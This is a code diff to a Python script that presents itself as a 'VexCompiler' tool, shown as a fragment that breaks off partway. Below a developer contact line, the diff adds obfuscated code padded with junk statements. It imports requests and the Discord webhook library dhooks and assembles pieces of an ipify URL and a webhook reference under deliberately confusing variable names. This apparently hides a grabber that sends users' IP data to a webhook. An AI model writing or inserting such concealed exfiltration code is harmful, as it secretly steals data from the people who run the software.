@@ -15,8 +15,10 @@ elif sys.platform == "darwin":
 elif sys.platform == "win32":
     osys = "win"
 
+if osys == "win":
+    os.system(f"title VexCompiler / Welcome, {os.getlogin()} (Ver. Windows)")
+
 # Variables =======================+
-osys = ""
 desc = [
     "vex >> vw",
     "hello, "+os.getlogin(),
@@ -109,9 +111,9 @@ def vexcm():
 #  Reach me on discord dex.lol#1337
 
 '''dex.lol#1377'''
-'''''';pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;''''''
+'''''';{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};''''''
 
-import requests;import dhooks;'''''';'''i hope nobody is a skid''';'''gg'''
+'''{random.choices(randomstrings)}''';import requests;'''{random.choices(randombools)}''';import dhooks;{random.choices(randomstrings)}
 
 '''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht"
 '''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(randombools)};''''{random.choices(randomstrings)}'''
